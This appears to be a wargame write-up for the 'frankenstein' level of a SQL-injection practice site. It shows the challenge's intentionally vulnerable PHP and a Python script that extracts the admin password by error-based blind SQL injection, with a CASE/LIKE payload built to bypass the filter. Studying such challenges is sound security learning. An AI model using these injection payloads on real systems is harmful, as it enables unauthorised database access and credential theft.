---
title : "LOS Lv.28 frankenstein"
categories : [Wargame, rubiya]
---


## frankenstein
```php
query : select id,pw from prob_frankenstein where id='frankenstein' and pw=''

<?php
  include "./config.php";
  login_chk();
  $db = dbconnect();
  if(preg_match('/prob|_|\.|\(|\)|union/i', $_GET[pw])) exit("No Hack ~_~");
  $query = "select id,pw from prob_frankenstein where id='frankenstein' and pw='{$_GET[pw]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if(mysqli_error($db)) exit("error");

  $_GET[pw] = addslashes($_GET[pw]);
  $query = "select pw from prob_frankenstein where id='admin' and pw='{$_GET[pw]}'";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("frankenstein");
  highlight_file(__FILE__);
?>
```

## Solution
```python
import requests
import string

url='https://los.rubiya.kr/chall/frankenstein_b5bab23e64777e1756174ad33f14b5db.php'
headers={'Content-Type':'application/x-www-form-urlencoded'}
cookies={'PHPSESSID':'[redacted]'}

pw=''
check='0123456789'+string.ascii_lowercase

for i in range(1,9) :
    for j in check :
        payload={'pw':"' or id='admin' and case when pw like '"+pw+j+"%' then 1 else 0xfffffffffff*0xffffffffffff end #"}
        res=requests.get(url,headers=headers, cookies=cookies, params=payload)
        if "<br>error" not in res.text :
            pw+=j
            print("pw:",pw) # 0dc4efbb
            break
   
print("FRANKENSTEIN CLEAR!")
```
```
오류를 부르는 방법 중 exp(710)이 있었는데 함수 사용 불가능.

해서 다음과 같은 방법도 있다고 함. 

DOUBLE value is out of range in '9e307*2'
```